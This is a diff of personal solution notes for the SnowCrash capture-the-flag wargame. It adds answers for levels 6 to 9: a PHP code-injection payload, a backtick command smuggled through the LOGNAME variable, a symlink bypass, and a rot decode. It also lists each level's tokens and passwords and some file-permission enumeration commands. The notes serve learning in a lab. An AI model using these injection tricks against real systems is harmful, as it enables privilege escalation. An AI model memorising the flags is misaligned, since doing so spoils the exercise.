@@ -68,7 +68,38 @@ echo "getflag > /var/crash/log" > /opt/openarenaserver/get
 
 token = viuaaale9huek52boumoomioc
 
-################  5  ################
+################  6  ################
+
+echo '[x {${exec(getflag)}}]' > /tmp/test.php
+level06@SnowCrash:~$ ./level06 /tmp/test.php
+
+token = wiok45aaoguiboiki2tuin6ub
+
+################  7  ################
+
+LOGNAME=\`getflag\`
+./level07
+
+token = fiumuikeil55xe9cu4dood66h
+
+################  8  ################
+
+ln -s ~/token /var/crash/link
+./level08 /var/crash/link
+
+password = quif5eloekouj29ke0vouxean
+
+token = 25749xKZ8L7DkSCwJkT9dyv6f
+
+################  9  ################
+
+use programme "un_rot" on file : token09
+
+password = f3iji1ju5yuevaus41q1afiuq
+
+token = s5cAJpM8ev6XHw998pRWG728z
+
+################  10  ################
 
 
 ################  NOTES  ################
@@ -94,4 +125,6 @@ find /-type f -exec bash -c 'test -r "$1" && echo "$1"' x {} \; 2> /dev/null -->
 
 find
 groups
-cat /etc/group
+cat /etc/grou
+
+getfacl --> donne description des perm
